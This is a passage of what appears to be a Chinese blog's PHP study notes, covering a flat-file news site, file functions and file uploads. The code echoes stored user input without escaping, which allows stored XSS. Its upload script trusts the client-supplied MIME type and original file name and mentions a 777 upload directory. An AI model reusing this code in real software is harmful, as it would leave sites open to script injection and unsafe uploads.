class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;增加新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;add_news.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    标号：&lt;input type=&quot;number&quot; name=&quot;id&quot;&gt;&lt;br&gt;</span><br><span class="line">    标题：&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;!--    标题：&lt;input type=&quot;text&quot; namne=&quot;title&quot;&gt;&lt;br&gt;--&gt;</span><br><span class="line">    内容：&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt;</span><br><span class="line">    日期：&lt;input type=&quot;date&quot; name=&quot;date&quot;&gt;&lt;br&gt;</span><br><span class="line">    作者：&lt;input type=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br&gt;</span><br><span class="line">    热度：&lt;input type=&quot;number&quot; name=&quot;hot&quot;&gt;&lt;br&gt;</span><br><span class="line">    图片：&lt;input type=&quot;url&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $fhandle = fopen(&apos;news.db &apos;, &apos;a&apos;);</span><br><span class="line">    $arrMes = array();</span><br><span class="line">    @$arrMes[0] = $_POST[&apos;id&apos;];</span><br><span class="line">    @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]);</span><br><span class="line">    @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]);</span><br><span class="line">    @$arrMes[3] = $_POST[&apos;date&apos;];</span><br><span class="line">    @$arrMes[4] = base64_encode($_POST[&apos;author&apos;]);</span><br><span class="line">    @$arrMes[5] = $_POST[&apos;hot&apos;];</span><br><span class="line">    @$arrMes[6]= $_POST[&apos;imgUrl&apos;];</span><br><span class="line">    if($arrMes[0]!=NULL) &#123;</span><br><span class="line">        $writeMes = implode(&apos;||&apos;, $arrMes);</span><br><span class="line">        //echo $writeMes;</span><br><span class="line">        $fline = fputs($fhandle, &quot;\n&quot;.$writeMes);</span><br><span class="line">        if($fline!=flase)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(\&quot;新闻添加成功！\&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;a href=&apos;../index.php&apos;&gt;点击查看&lt;/a&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function alertInfo()&#123;</span><br><span class="line">        alert(&quot;新闻添加成功！&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="四、展示新闻界面-index-php"><a href="#四、展示新闻界面-index-php" class="headerlink" title="四、展示新闻界面 index.php"></a>四、展示新闻界面 index.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;news&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 align=&quot;center&quot;&gt;ICQ新闻中心&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;table align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;热度&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;作者&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;时间&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;素质三联&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        //用只读方式打开news.db文件</span><br><span class="line">        $fhandle = fopen(&quot;./data/news.db&quot;, &quot;r&quot;);</span><br><span class="line">        //设置一个计数器，小于3时，每个文章标题下面增加图片和简介</span><br><span class="line">        $top3Cnt=1;</span><br><span class="line">        while(!feof($fhandle)) &#123;</span><br><span class="line">            $fline = fgets($fhandle);</span><br><span class="line">            $data = explode(&apos;||&apos;, $fline);</span><br><span class="line">            @$title = base64_decode($data[1]);</span><br><span class="line">            @$content = base64_decode($data[2]);</span><br><span class="line">            @$date = $data[3];</span><br><span class="line">            @$author = base64_decode($data[4]);</span><br><span class="line">            @$hot = $data[5];</span><br><span class="line">            @$imgUrl = $data[6];</span><br><span class="line">            echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;tr align=&quot;center&quot;&gt;</span><br><span class="line">            &lt;td&gt;$hot&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$author&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$date&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;button&gt;👍&lt;/button&gt;/&lt;button&gt;👎&lt;/button&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">        if($top3Cnt&lt;=3)&#123;</span><br><span class="line">            $tmpContent = mb_substr(base64_decode($data[2]), 0,50);</span><br><span class="line">            echo &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;内容简介：&lt;/b&gt;$tmpContent&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">        &#125;</span><br><span class="line">        $top3Cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note19</title>
      <link href="/2019/08/08/note19/"/>
      <url>/2019/08/08/note19/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP中文件和文件夹操作常用函数以及文件上传功能的介绍和应用，对新闻界面添加用户登录注册界面等。</p><a id="more"></a><!--export--><h3 id="一、文件和文件夹操作常用函数"><a href="#一、文件和文件夹操作常用函数" class="headerlink" title="一、文件和文件夹操作常用函数"></a>一、文件和文件夹操作常用函数</h3><h4 id="1-文件内容操作"><a href="#1-文件内容操作" class="headerlink" title="1. 文件内容操作"></a>1. 文件内容操作</h4><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>fopen()</td><td>打开文件或URL</td></tr><tr><td>fread()</td><td>读取打开的文件</td></tr><tr><td>fgets()</td><td>从打开的文件中返回一行</td></tr><tr><td>fputs()/fwrite()</td><td>写入打开的文件</td></tr><tr><td>copy()</td><td>复制文件</td></tr><tr><td>fclose()</td><td>关闭打开的文件</td></tr><tr><td>file_get_contents()</td><td>把文件读入字符串</td></tr><tr><td>file_put_contents()</td><td>把字符串写文件</td></tr><tr><td>basename()</td><td>返回路径中文件名部分</td></tr><tr><td>filesize()</td><td>返回文件大小</td></tr></tbody></table><ul><li>fread(handle, length)/filesize(filesize)/copy(file, to_file)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;test.txt&quot;, &quot;r&quot;);</span><br><span class="line">$contents = fread($file, &quot;10&quot;);</span><br><span class="line">$size = filesize(&quot;test.txt&quot;);</span><br><span class="line">echo copy(&quot;source.txt&quot;, &quot;target.txt&quot;);</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>basename(path,suffix) </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;/testweb/home.php&quot;;</span><br><span class="line">//home.php</span><br><span class="line">echo basename($path) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">//home</span><br><span class="line">echo basename($path, &quot;.php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>file_get_contents(path, include_path, context, start, max_length)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//This is a test file with test text</span><br><span class="line">echo file_get_contents(&quot;test.txt&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>file_put_contents()函数：成功返回写入文件的字符数，失败则返回False</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 6</span><br><span class="line">echo file_put_contents(&quot;sites.txt&quot;, &quot;Runoob&quot;);</span><br><span class="line"></span><br><span class="line">$file = &apos;sites.txt&apos;;</span><br><span class="line"> </span><br><span class="line">$site = &quot;\nGoogle&quot;;</span><br><span class="line">// 向文件追加写入内容</span><br><span class="line">// 使用 FILE_APPEND 标记，可以在文件末尾追加内容</span><br><span class="line">//  LOCK_EX 标记可以防止多人同时写入</span><br><span class="line">file_put_contents($file, $site, FILE_APPEND | LOCK_EX);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2.文件操作"></a>2.文件操作</h4><table><thead><tr><th>函数名</th><th align="center">作用</th></tr></thead><tbody><tr><td>file_exists()</td><td align="center">检查文件或目录是否存在</td></tr><tr><td>filetype()</td><td align="center">返回文件类型</td></tr><tr><td>is_dir()</td><td align="center">判断文件是否是一个目录</td></tr><tr><td>is_file()</td><td align="center">判断文件是否是常规的文件</td></tr><tr><td>mkdir()</td><td align="center">创建目录</td></tr><tr><td>rename()</td><td align="center">重命名文件或目录</td></tr><tr><td>rmdir()</td><td align="center">删除空的目录</td></tr><tr><td>unlink()</td><td align="center">删除文件</td></tr></tbody></table><ul><li>file_exists(path)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 1</span><br><span class="line">echo file_exists(&quot;test.txt&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>filetype(filename)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// fifo   char   dir blocklinkfileunknown</span><br><span class="line">//file</span><br><span class="line">echo filetype(&quot;test.txt&quot;);</span><br><span class="line">//dir</span><br><span class="line">echo filetype(&quot;images&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h3><h4 id="1-创建一个文件上传表单"><a href="#1-创建一个文件上传表单" class="headerlink" title="1. 创建一个文件上传表单"></a>1. 创建一个文件上传表单</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload_file.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;form&gt;</code>标签的<code>enctype</code>属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，使用<code>multipart/form-data</code>。</li><li><code>&lt;input&gt;</code>标签<code>type=&quot;file&quot;</code>属性规定了应该把输入作为文件来处理。</li></ul><h4 id="2-创建上传脚本-upload-file-php"><a href="#2-创建上传脚本-upload-file-php" class="headerlink" title="2. 创建上传脚本 upload_file.php"></a>2. 创建上传脚本 upload_file.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)&#123;</span><br><span class="line">        //由文件上传导致的错误代码</span><br><span class="line">        echo &quot;错误&quot; .$_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //上传文件的名称</span><br><span class="line">        echo &quot;上传文件名：&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //上传文件的类型</span><br><span class="line">        echo &quot;文件类型：&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //上传文件的大小</span><br><span class="line">        echo &quot;文件大小：&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //存储在服务器的文件临时副本的名称</span><br><span class="line">        echo &quot;文件临时存储位置：&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-上传限制"><a href="#3-上传限制" class="headerlink" title="3. 上传限制"></a>3. 上传限制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//允许上传图片后缀</span><br><span class="line">$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">$temp = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">//获取文件后缀名</span><br><span class="line">$extension = end($temp);</span><br><span class="line">if((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</span><br><span class="line"> &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)</span><br><span class="line"> &amp;&amp; (in_array($extension, $allowedExts)))&#123;</span><br><span class="line">    if($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">        echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">          //上传文件的名称</span><br><span class="line">        echo &quot;上传文件名：&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //上传文件的类型</span><br><span class="line">        echo &quot;文件类型：&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //上传文件的大小</span><br><span class="line">        echo &quot;文件大小：&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //存储在服务器的文件临时副本的名称</span><br><span class="line">        echo &quot;文件临时存储位置：&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;非法文件的格式&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="4-保存被上传的文件"><a href="#4-保存被上传的文件" class="headerlink" title="4. 保存被上传的文件"></a>4. 保存被上传的文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//允许上传图片后缀</span><br><span class="line">$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">$temp = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">//获取文件后缀名</span><br><span class="line">$extension = end($temp);</span><br><span class="line">if((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)</span><br><span class="line"> || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</span><br><span class="line"> &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)</span><br><span class="line"> &amp;&amp; (in_array($extension, $allowedExts)))&#123;</span><br><span class="line">    if($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">        echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">          //上传文件的名称</span><br><span class="line">        echo &quot;上传文件名：&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //上传文件的类型</span><br><span class="line">        echo &quot;文件类型：&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //上传文件的大小</span><br><span class="line">        echo &quot;文件大小：&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        //存储在服务器的文件临时副本的名称</span><br><span class="line">        echo &quot;文件临时存储位置：&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        </span><br><span class="line">        //判断当前目录下的upload目录是否存在该文件</span><br><span class="line">        //如果没有upload目录，需要创建它，upload目录权限为777</span><br><span class="line">        if(file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">            echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;文件已经存在&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        //如果upload目录不存在该文件则将文件上传到upload目录下</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">            echo &quot;文件存储在：&quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;非法文件的格式&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>关于上传文件的起名常常加上时间戳。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note18</title>
      <link href="/2019/08/07/note18/"/>
      <url>/2019/08/07/note18/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP数组索引数组和关联数组的遍历，以及数组常用的函数；PHP文件处理常用函数以及不同模式下对文件的操作。</p><a id="more"></a><!--export--><h3 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h3><h4 id="1-数组遍历"><a href="#1-数组遍历" class="headerlink" title="1. 数组遍历"></a>1. 数组遍历</h4><ul><li>索引数组 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr1 = [&apos;wm&apos;, 56, &apos;Beijing&apos;];</span><br><span class="line">for($i=0; $i&lt;count($arr1); $i++)&#123;</span><br><span class="line">    echo $arr1[$i];</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li><p>关联数组</p><p><code>foreach</code>遍历</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = [</span><br><span class="line">    &apos;name&apos; =&gt; &apos;zs&apos;,</span><br><span class="line">    &apos;age&apos;  =&gt; 18,</span><br><span class="line">    &apos;add&apos;  =&gt; &apos;China&apos;</span><br><span class="line">];</span><br><span class="line">foreach($arr as $item =&gt;$value)&#123;</span><br><span class="line">    echo $item . &quot;=&gt;&quot; . $value;</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    <code>for</code>遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span 